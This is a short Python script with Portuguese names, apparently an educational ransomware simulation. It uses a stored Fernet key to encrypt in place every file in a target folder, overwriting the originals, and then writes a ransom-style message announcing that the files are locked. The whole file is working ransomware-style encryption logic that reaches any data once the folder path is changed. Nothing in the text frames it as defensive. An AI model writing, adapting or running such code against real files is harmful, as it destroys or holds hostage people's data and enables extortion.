import os
from cryptography.fernet import Fernet

CAMINHO_PASTA = "../arquivos_alvo"

def carregar_chave():
    with open("chave.key", "rb") as arquivo:
        return Fernet(arquivo.read())

def criptografar():
    fernet = carregar_chave()

    for nome_arquivo in os.listdir(CAMINHO_PASTA):
        caminho_completo = os.path.join(CAMINHO_PASTA, nome_arquivo)

        if os.path.isfile(caminho_completo):
            with open(caminho_completo, "rb") as arquivo:
                dados = arquivo.read()

            dados_criptografados = fernet.encrypt(dados)

            with open(caminho_completo, "wb") as arquivo:
                arquivo.write(dados_criptografados)

            print(f"[CRIPTOGRAFADO] {nome_arquivo}")

    with open("mensagem_resgate.txt", "w", encoding="utf-8") as msg:
        msg.write(
            "SEUS ARQUIVOS FORAM CRIPTOGRAFADOS!\n\n"
            "Os arquivos dentro da pasta 'arquivos_alvo' foram bloqueados.\n"
            "Para descriptografar, execute o script: descriptografar.py\n"
        )

if __name__ == "__main__":
    criptografar()
